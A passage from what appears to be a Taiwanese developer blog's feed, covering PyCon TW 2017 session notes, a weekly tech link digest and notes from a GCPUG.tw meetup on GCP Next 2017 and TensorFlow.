&lt;p&gt;微軟是主要出資者，所以開這個會議的時候不是微軟的電腦都要收起來，但天文分析基本上都是用 Unix-like 的系統，所以開完會又會拿出來 XDDD  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Q&amp;amp;A  &lt;ul&gt;
&lt;li&gt;為什麼用 Cython 不用 PyPy，有考慮換成 PyPy 嗎？  &lt;ul&gt;
&lt;li&gt;沒有，因為我只是使用者，這邊不是我負責的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;有可能發生像電影那樣，突然發現有個朝地球高速來襲的小行星嗎？  &lt;ul&gt;
&lt;li&gt;有可能，因為距離要到夠近才有辦法偵測到。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;筆直衝過來的小行星只會有一個點，這有辦法偵測到嗎？  &lt;ul&gt;
&lt;li&gt;目前這個比較難處理  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;真的發現有會造成地球物種大規模毀滅的小行星朝地球衝過來怎麼辦？  &lt;ul&gt;
&lt;li&gt;基本上目前想到的方法都不太可行，例如：核彈爆破、派人上去鑽礦等等  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;CPython code sprint&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://docs.python.org/devguide/"&gt;https://docs.python.org/devguide/&lt;/a&gt;  &lt;/p&gt;
&lt;h2&gt;一個軟體工程師在農村的見聞&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://ocf.tw/p/2017/openhackfarm/"&gt;http://ocf.tw/p/2017/openhackfarm/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Slides: https://hackmd.io/p/Hyzjn1FGb#/  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;懶得答題？寫個 bot 來幫你刷榜&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Slides: https://github.com/aweimeow/PyConTW2017-UnConf-Slide  &lt;/li&gt;
&lt;li&gt;Code: https://github.com/aweimeow/PyConTW2017-Quiz-Solver  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;初めてのプログラミングならパイザで始めよう☆&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Online Judge Special Events  &lt;ul&gt;
&lt;li&gt;https://paiza.jp/logic_summoner  &lt;/li&gt;
&lt;li&gt;https://paiza.jp/cgc  &lt;/li&gt;
&lt;li&gt;https://paiza.jp/poh/hatsukoi  &lt;/li&gt;
&lt;li&gt;https://paiza.jp/poh/ando  &lt;/li&gt;
&lt;li&gt;https://paiza.jp/moshijo  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;預訂現場live解一題看看,破除never live demo迷思(?)  &lt;/p&gt;
&lt;p&gt;hatsukoi 雙馬尾參考答案(Python3)&lt;br /&gt;
```python=  &lt;/p&gt;
&lt;h1&gt;coding: utf-8&lt;/h1&gt;
&lt;h1&gt;自分の得意な言語で&lt;/h1&gt;
&lt;h1&gt;Let's チャレンジ！！&lt;/h1&gt;
&lt;p&gt;s = int(input())&lt;br /&gt;
t = int(input())&lt;br /&gt;
print(''.join(('-', '+')[i+1==t] for i in range(s)))&lt;br /&gt;
```  &lt;/p&gt;</summary><category term="Python"></category><category term="PyCon"></category><category term="PyCon TW"></category></entry><entry><title>Y2017W22</title><link href="https://blog.m157q.tw/posts/2017/06/05/y2017w22/" rel="alternate"></link><published>2017-08-28T21:27:00+08:00</published><updated>2017-08-28T21:27:00+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-06-05:posts/2017/06/05/y2017w22/</id><summary type="html">&lt;h3&gt;alphago&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://pingyeh.blogspot.tw/2017/05/alphago.html"&gt;ping不見路:  懂規則不懂規矩的 AlphaGo&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;原來那張五個人哭笑不得的照片是因為這樣啊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;bitcoin&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/@andylinee/%E6%AF%94%E7%89%B9%E5%B9%A3-%E7%AB%AF%E5%B0%8D%E7%AB%AF%E9%9B%BB%E5%AD%90%E7%8F%BE%E9%87%91%E7%B3%BB%E7%B5%B1-bitcoin-a-peer-to-peer-electronic-cash-system-i-8a52de003c9"&gt;《比特幣：端對端電子現金系統》（Bitcoin: A Peer-to-Peer Electronic Cash System）I&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;隨著比特幣今年暴漲，開始看到有更多人對用區塊鏈技術實現的加密貨幣產生興趣，所以就趁著連假把之前整理到一半的比特幣論文重新翻譯，提供給大家參考！此篇為論文的前半部分，下半部分將會在下一篇。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;git&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.louie.lu/2017/06/01/%E5%85%A8%E9%9D%A2%E7%AB%84%E6%94%B9-git-commit-%E6%AD%B7%E5%8F%B2%E8%A8%98%E9%8C%84/amp/"&gt;全面竄改 git commit 歷史記錄 | louie_lu's blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;想到以前打某個 CTF 好像玩過更有趣的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;github&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/blog/2370-introducing-temporary-interaction-limits"&gt;Introducing temporary interaction limits · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;linux&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://szlin.me/2017/05/28/linux-kernel-perf-openvpn/"&gt;以 Linux kernel 效能工具 – perf 來分析探討硬體加密之瓶頸 – SZ Lin  &amp;amp; Embedded Linux&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.linuxquestions.org/questions/linux-newbie-8/fedora-11-sudo-has-a-20-second-start-delay-732291/#post3575840"&gt;Fedora 11 sudo has a 20 second start delay&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;沒把自己電腦的 hostname 加到 &lt;code&gt;/etc/hosts&lt;/code&gt; 的話可能會遇到 &lt;code&gt;sudo&lt;/code&gt; hang 住的狀況  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;machine learning&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/kazunori279/TensorFlow-for-absolute-beginners"&gt;GitHub - kazunori279/TensorFlow-for-absolute-beginners: TensorFlow for absolute beginners: a 3-hour codelab for self-learning neural network basics without hard math.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.gslin.org/archives/2017/05/28/7352/%e9%80%8f%e9%81%8e-nn-%e9%a1%9e%e7%a5%9e%e7%b6%93%e7%b6%b2%e8%b7%af-%e8%a8%93%e7%b7%b4%e5%a5%bd%e7%9a%84%e7%b3%bb%e7%b5%b1%ef%bc%8c%e7%9b%b4%e6%8e%a5%e6%8a%8a%e5%9c%96%e7%89%87%e8%bd%89%e6%88%90/"&gt;透過 NN (類神經網路) 訓練好的系統，直接把圖片轉成程式碼 | Gea-Suan Lin's BLOG&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這好像有點神  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;miracast&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.2cm.com.tw/technologyshow_content.asp?sn=1304260008"&gt;以鏡射與Wi-Fi技術為基礎　Miracast實現多螢影音串流 - 技術前瞻 - 新通訊元件雜誌&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Miracast是Wi-Fi聯盟的認證名稱，原來的技術規格名稱為Wi-Fi Display，是Wi-Fi聯盟為鞏固其在無線應用的龍頭地位，基於既有無線通訊技術提出的殺手級應用。該技術與認證項目由Wi-Fi聯盟中的行動與消費性電子設備製造商及晶片廠商  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/derekdai/miraclecast"&gt;GitHub - derekdai/miraclecast: Connect external monitors to your system via Wifi-Display specification also known as Miracast&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;The MiracleCast project provides software to connect external monitors to your system via Wi-Fi. It is compatible to the Wifi-Display specification also known as Miracast. MiracleCast implements the Display-Source as well as Display-Sink side.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/01org/wds"&gt;01org/wds: Wireless Display Software For Linux OS (WDS)&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;WDS is a set of libraries for developers who want to build Wi-Fi Display applications on linux.  More information can be found on the mailing list and the wiki.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programming&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://teddy-chen-tw.blogspot.tw/2017/06/scrum.html"&gt;搞笑談軟工: 高效率Scrum團隊的九個模式&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://dotblogs.com.tw/hatelove/2017/05/30/my-opinions-of-code-coverage-and-tdd"&gt;[Comments] 測試覆蓋率與 TDD 的正確心態 | In 91 - 點部落&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這個心態挺不錯的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://about.gitlab.com/2017/05/02/inside-gitlabs-code-review-flow/"&gt;Inside GitLab's Code Review Flow | GitLab&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Code review, or engineers manually reviewing code as it is being developed, is one of several tools that organizations have to maintain code quality.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;security&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.freebuf.com/vuls/135610.html"&gt;看我如何發現Twitter任意賬戶發送推文漏洞並獲得7560美元賞金 - FreeBuf.COM | 關注黑客與極客&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;在参与Twitter漏洞赏金项目的过程中，我通过一些安全测试发现了Twitter存在的重大漏洞：攻击者不需要获取他人账户权限，就能以任意账户发布推文。我于2017年2月26日发现了该漏洞，Twitter方面于2017年2月28日及时对其进行了修  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;ptt&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/SYSOP/M.1496571808.A.608.html"&gt;[公告] 即日起實驗性開放 Websocket 連線 - 看板 SYSOP - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;潮！  &lt;/li&gt;
&lt;li&gt;看了才發現是之前有看過的 PttChrome  &lt;/li&gt;
&lt;li&gt;不過因為是走 telnet 沒加密 所以就沒用  &lt;/li&gt;
&lt;li&gt;現在用 ws 就有加密啦  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/SYSOP/M.1496571808.A.608.html"&gt;[公告] 即日起實驗性開放 Websocket 連線 - 看板 SYSOP - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;時間Sun Jun 4 18:23:26 2017 PTT 目前實驗性的加入 Websocket 連線方式. 連線的位置為 wss://ws.ptt.cc/bbs 為 ssh 之外提供另一個加密連線的方式, 加密連線也將會是 Websocket 唯一支援的連線方式.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;misc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=ksFXEY6P_ec&amp;amp;feature=share"&gt;Apple Pay 是怎麼運作的? | 一探啾竟 第1集 | 啾啾鞋 - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;新的系列好像都跟電腦資訊比較有關  &lt;/li&gt;
&lt;li&gt;而且介紹得雖然不深但頗清楚的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://disp.cc/b/163-a4zW"&gt;Re: [問卦] 葛瑪蘭威士忌是化工？ - Gossiping板 - Disp BBS&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;酒色是一個錯誤觀念，但這個錯誤觀念從外國延續到台灣  目前國外有很多酒廠極力澄清這個說法，不過華人世界還是都很看色澤這一套  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;life&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.byvoid.com/zht/blog/switzerland-dwelling-notes-5-paradise-on-earth"&gt;瑞士旅居記（五）：人間天堂 - BYVoid&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.inside.com.tw/2017/05/31/why-do-you-keep-articles-and-books-and-never-read"&gt;收藏者悖論：收藏了大量文章卻又不看，「囤書癮」該怎麼解？ - INSIDE 硬塞的網路趨勢觀察&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;收藏者悖論：收藏了大量文章卻又不看，「囤書癮」該怎麼解？ 日語中有一個單詞叫做 tsundoku (積ん読)，意為「買了大量的書堆在家裡但卻又不看」。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="alphago"></category><category term="bitcoin"></category><category term="git"></category><category term="github"></category><category term="life"></category><category term="linux"></category><category term="machine learning"></category><category term="miracast"></category><category term="misc"></category><category term="programming"></category><category term="ptt"></category><category term="security"></category></entry><entry><title>GCPUG.tw #26</title><link href="https://blog.m157q.tw/posts/2017/06/02/gcpug-tw-26/" rel="alternate"></link><published>2017-06-02T21:39:53+08:00</published><updated>2017-06-02T21:39:53+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-06-02:posts/2017/06/02/gcpug-tw-26/</id><summary type="html">&lt;p&gt;Event link: &lt;a href="https://gcpugtw.kktix.cc/events/meetup201706"&gt;https://gcpugtw.kktix.cc/events/meetup201706&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;GCP Next 2017 recap&lt;/h3&gt;
&lt;h4&gt;Keynote&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Fe-Fe Li  &lt;/li&gt;
&lt;li&gt;Vint Cerf  &lt;ul&gt;
&lt;li&gt;TCP/IP  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Mac Andreessen  &lt;ul&gt;
&lt;li&gt;Netscape  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Eric Schmidt  &lt;ul&gt;
&lt;li&gt;Google has spent $30B in building Google Cloud in the past 3 years.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Migrate 到 GCP 的知名企業  &lt;ul&gt;
&lt;li&gt;Disney  &lt;/li&gt;
&lt;li&gt;SAP  &lt;/li&gt;
&lt;li&gt;高露潔  &lt;/li&gt;
&lt;li&gt;Verizon  &lt;/li&gt;
&lt;li&gt;Home Depot  &lt;/li&gt;
&lt;li&gt;HSBC  &lt;ul&gt;
&lt;li&gt;金融業算是對 Cloud 這部份最保守的行業  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;eBay  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;其他重要公佈  &lt;ul&gt;
&lt;li&gt;2017 有 4 個新 Region  &lt;/li&gt;
&lt;li&gt;2018 有 5 個新 Region  &lt;/li&gt;
&lt;li&gt;Cloud Spanner beta  &lt;/li&gt;
&lt;li&gt;Committed-Used Discount  &lt;/li&gt;
&lt;li&gt;Titan  &lt;/li&gt;
&lt;li&gt;Dataprep  &lt;/li&gt;
&lt;li&gt;Video Intelligence API  &lt;ul&gt;
&lt;li&gt;進階版的 Vision API  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Data Loss Prevention (in G Suite)  &lt;/li&gt;
&lt;li&gt;CloudSQL w/ PostgreSQL  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;大會議程&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Kubernetes  &lt;ul&gt;
&lt;li&gt;Fast Develop Productivity  &lt;/li&gt;
&lt;li&gt;Efficient Scale Out  &lt;/li&gt;
&lt;li&gt;Open Architecture  &lt;/li&gt;
&lt;li&gt;Serverless / NoOps  &lt;/li&gt;
&lt;li&gt;Security  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tensorflow  &lt;ul&gt;
&lt;li&gt;利用 MINST 的手寫字體作為 demo  &lt;/li&gt;
&lt;li&gt;Softmax classification  &lt;/li&gt;
&lt;li&gt;Noisy  &lt;/li&gt;
&lt;li&gt;Overfitting  &lt;/li&gt;
&lt;li&gt;Learning Rate Decay  &lt;/li&gt;
&lt;li&gt;Dropout  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://goo.gl/pHeXe7"&gt;https://goo.gl/pHeXe7&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.comn/martin-gorner/tensorflow-mnist-tutorial"&gt;https://github.comn/martin-gorner/tensorflow-mnist-tutorial&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cloud Spanner  &lt;ul&gt;
&lt;li&gt;Google DoubleClick / AdWords 內部自己在用的服務  &lt;/li&gt;
&lt;li&gt;Scalabiltiy - 只要把 instance number 改掉  &lt;/li&gt;
&lt;li&gt;會自己學習你的 Query Pattern, 自動優化資料  &lt;/li&gt;
&lt;li&gt;Interleave Table  &lt;ul&gt;
&lt;li&gt;Table 之間的 Logical relation  &lt;/li&gt;
&lt;li&gt;Pre-computed JOIN  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;也是需要 Warmup  &lt;/li&gt;
&lt;li&gt;有人直接拿來取代 MySQL 來用 (Quizlet)  &lt;ul&gt;
&lt;li&gt;500GB Data, 8 billions rows  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cloud Storage and Optimization Tuning  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;教育訓練與認証&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Codelabs  &lt;ul&gt;
&lt;li&gt;各個 Google Cloud 主題的互動式免費教學  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;GCP 認証  &lt;ul&gt;
&lt;li&gt;Data Engineer  &lt;ul&gt;
&lt;li&gt;設計資料、資料模型  &lt;/li&gt;
&lt;li&gt;什麼資料要用什麼服務放  &lt;ul&gt;
&lt;li&gt;BigTable, BigQuery, Datastore, GCS, ...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cloud Architect  &lt;ul&gt;
&lt;li&gt;架構設計、Solution 選擇  &lt;/li&gt;
&lt;li&gt;安全性設計  &lt;/li&gt;
&lt;li&gt;成本最佳化 (Cost-down)  &lt;/li&gt;
&lt;li&gt;現有服務整合  &lt;/li&gt;
&lt;li&gt;要花 200 鎂  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;技術展示&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Jupiter Switch  &lt;ul&gt;
&lt;li&gt;Google 自製的 Data Center Switch  &lt;/li&gt;
&lt;li&gt;單櫃有 1300 Tbps 的 throughput  &lt;/li&gt;
&lt;li&gt;Juniper 最大台的 MX2020 也只有 80 Tbps 的 throughput  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Pokemon Go  &lt;ul&gt;
&lt;li&gt;CRE (Customer Reliability Engineer)  &lt;ul&gt;
&lt;li&gt;專案夠大的話，Google 會派工程師去協助該公司解決問題  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Datastore 無痛 auto-scaling 50 倍的預期流量  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Machine Learning + 農業  &lt;ul&gt;
&lt;li&gt;日本人用 Raspberry Pi + Tensorflow 替農夫用電腦來做小黃瓜等級篩選  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Evernote 搬家  &lt;ul&gt;
&lt;li&gt;在 70 天內搬了 3.5 PB  &lt;/li&gt;
&lt;li&gt;提升使用者存取速度  &lt;/li&gt;
&lt;li&gt;安全性提升  &lt;/li&gt;
&lt;li&gt;搬家的主要原因是為了做 Machine Learning  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;LUSH  &lt;ul&gt;
&lt;li&gt;22 天就把全部環境包含軟體開發流程搬上 GCP  &lt;/li&gt;
&lt;li&gt;典型的先用 G Suite 再考慮 GCP 的客戶  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cloud Spanner  &lt;ul&gt;
&lt;li&gt;主打 ACID、水平擴展、高可靠度  &lt;/li&gt;
&lt;li&gt;...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;G Suite  &lt;ul&gt;
&lt;li&gt;Hangout 改版，主打多人會議功能  &lt;/li&gt;
&lt;li&gt;可以 25 個人同時視訊會議  &lt;/li&gt;
&lt;li&gt;Data Loss Prevention  &lt;/li&gt;
&lt;li&gt;Jamboard  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;TensorFlow in the Wild&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Speaker: &lt;a href="https://github.com/kazunori279"&gt;Kaz Sato&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Staff Developer Advocate Data &amp;amp; Analytics, Google Cloud  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Machine Learning? AI? Neural Network?  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Artificial Intelligence  &lt;ul&gt;
&lt;li&gt;The science of making things smart  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Machine Learning  &lt;ul&gt;
&lt;li&gt;Building machines that can learn  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Neural Network  &lt;ul&gt;
&lt;li&gt;A type of algorithm in machine learning  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Neural Network  &lt;ul&gt;
&lt;li&gt;is a function that can learn  &lt;/li&gt;
&lt;li&gt;tons of multiply and add  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://playground.tensorflow.org"&gt;http://playground.tensorflow.org&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ML at Google  &lt;ul&gt;
&lt;li&gt;Almost every products in Google use Maching Learning  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://deepmind.com/blog/wavenet-generative-model-raw-audio"&gt;https://deepmind.com/blog/wavenet-generative-model-raw-audio&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Generate bit by bit with Neural Network  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Deteciton of Diabetic disease  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://keynote-video-demo.appspot.com/video/barcelona-webm"&gt;https://keynote-video-demo.appspot.com/video/barcelona-webm&lt;/a&gt; (Login Required)  &lt;ul&gt;
&lt;li&gt;可以分析影片中每一秒出現的物件是什麼，有點像是把每一個 frame 都丟去給 Vision API 後得到的結果  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Tensorflow&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Open Source  &lt;/li&gt;
&lt;li&gt;Easy to use  &lt;/li&gt;
&lt;li&gt;You can use it to train your own data  &lt;/li&gt;
&lt;li&gt;Protable and Scalable  &lt;ul&gt;
&lt;li&gt;Training on  &lt;ul&gt;
&lt;li&gt;Mac / Windows  &lt;/li&gt;
&lt;li&gt;GPU Server  &lt;/li&gt;
&lt;li&gt;GPU cluster / cloud  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Prediction on  &lt;ul&gt;
&lt;li&gt;Android and iOS  &lt;/li&gt;
&lt;li&gt;RPi and TPU  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;With great tools like &lt;a href="https://www.tensorflow.org/get_started/summaries_and_tensorboard"&gt;TensorBoard&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;TensorFlow 1.0 released in Feb 2017  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://keras.io/"&gt;Keras&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/kazunori279/TensorFlow-for-absolute-beginners/blob/master/2.%20Classify%20Manhattan%20with%20TensorFlow.ipynb"&gt;Classifying Manhattan with TensorFlow and BigQuery&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/kazunori279/TensorFlow-for-absolute-beginners"&gt;https://github.com/kazunori279/TensorFlow-for-absolute-beginners&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Community and Eco-System  &lt;/li&gt;
&lt;li&gt;Demo of TensorFlow  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/blog/big-data/2016/08/how-a-japanese-cucumber-farmer-is-using-deep-learning-and-tensorflow"&gt;TensorFlow powered Cucumber Sorter&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;電腦也碼ㄟ選小黃瓜  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.rt-net.jp/karaage1/"&gt;TensorFlow powered Fried Chicken Nugget Server&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;人工智慧炸雞塊...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://memo.sugyan.com/entry/2016/10/12/084751"&gt;TV popstar face generator with DCGAN&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;TensorFLow in enterprise  &lt;ul&gt;
&lt;li&gt;The Challenge: Computing Power  &lt;/li&gt;
&lt;li&gt;Cloud Maching Learning Engine (ML Engine)  &lt;ul&gt;
&lt;li&gt;Fully manged distributed training and prediction  &lt;/li&gt;
&lt;li&gt;Scales to tens of CPUs and GPUs  &lt;/li&gt;
&lt;li&gt;Supports custom TensorFlow Graphs  &lt;/li&gt;
&lt;li&gt;HyperTune  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.techrepublic.com/article/7-companies-that-used-machine-learning-to-solve-real-business-problems/"&gt;Real cases&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Kewpie: Finding the bad potato cubes (by TensorFlow)  &lt;ul&gt;
&lt;li&gt;A major food manufacturer in Japan  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;AXA: Finding "large loss" car accidents  &lt;ul&gt;
&lt;li&gt;TensorFlow gives 78% accuracy  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;AUCNET IBS  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://konpeki.io/"&gt;https://konpeki.io/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;AUCNET IBS is a car auction service in Japan. The company relies on multiple photos for each vehicle, and they were previously sorted and categorized manually. AUCNET IBS built an image classifier that detects the model of the car and the parts featured in the photo with 95% accuracy.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;TensorFlow + BigQuery  &lt;ul&gt;
&lt;li&gt;Define an UDF to calc similariry  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/bigquery/user-defined-functions"&gt;UDF: User-defined Functions&lt;/a&gt;  &lt;/li&gt;
